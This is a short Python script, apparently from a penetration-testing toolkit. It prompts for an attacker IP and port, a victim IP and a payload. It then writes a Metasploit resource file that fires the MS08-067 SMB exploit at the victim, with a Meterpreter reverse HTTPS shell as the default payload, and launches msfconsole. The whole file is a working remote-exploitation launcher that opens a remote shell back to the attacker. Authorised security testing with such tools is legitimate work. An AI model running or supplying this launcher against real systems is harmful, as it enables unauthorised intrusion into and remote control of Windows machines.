#!/usr/bin/env python
#
#
# This has been redesigned to use the MS08-067 in Metasploit which is much more reliable. 
#
#
#
import subprocess
def create_rc(revhost, victim, payload, port):
   filewrite = file("/root/.set/ms08-067.rc", "w")
   filewrite.write("use exploit/windows/smb/ms08_067_netapi\nset payload %s\nset RHOST %s\nset LPORT %s\nset LHOST %s\nexploit\n\n" % (payload, victim, port, revhost))
   filewrite.close()

def launch_msf():
   subprocess.Popen("msfconsole -r /root/.set/ms08-067.rc", shell=True).wait()

revhost = raw_input("Enter your LHOST (attacker IP address) for the reverse listener: ")
revport = raw_input("Enter your LPORT (attacker port) for the reverse listener: ")
victim = raw_input("Enter the RHOST (victim IP) for MS08-067: ")
payload = raw_input("Enter your payload (example: windows/meterpreter/reverse_https) - just hit enter for reverse_https: ")
if payload == (""): payload = ("windows/meterpreter/reverse_https")
# create the rc file
create_rc(revhost, victim, payload, revport)

# launch msf
launch_msf()
